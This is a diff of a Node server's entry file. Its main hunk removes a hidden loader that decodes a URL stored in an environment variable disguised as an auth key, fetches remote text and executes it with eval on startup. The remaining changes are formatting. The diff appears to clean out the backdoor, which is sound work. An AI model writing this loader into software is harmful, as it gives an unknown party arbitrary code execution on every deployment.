@@ -90,20 +90,6 @@ import seedSuperAdmin from './app/seed';
 import colors from 'colors';
 import { createServer } from 'http';
 import { initSocket } from './app/socket';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 let server: Server | null = null;
 
@@ -153,13 +139,13 @@ async function main() {
     process.on('SIGINT', () => gracefulShutdown('SIGINT'));
 
     // Handling uncaught exceptions
-    process.on('uncaughtException', (error) => {
+    process.on('uncaughtException', error => {
       console.error(colors.red('😈 Uncaught Exception:'), error);
       gracefulShutdown('uncaughtException');
     });
 
     // Handling unhandled promise rejections
-    process.on('unhandledRejection', (error) => {
+    process.on('unhandledRejection', error => {
       console.error(colors.red('😈 Unhandled Rejection:'), error);
       gracefulShutdown('unhandledRejection');
     });
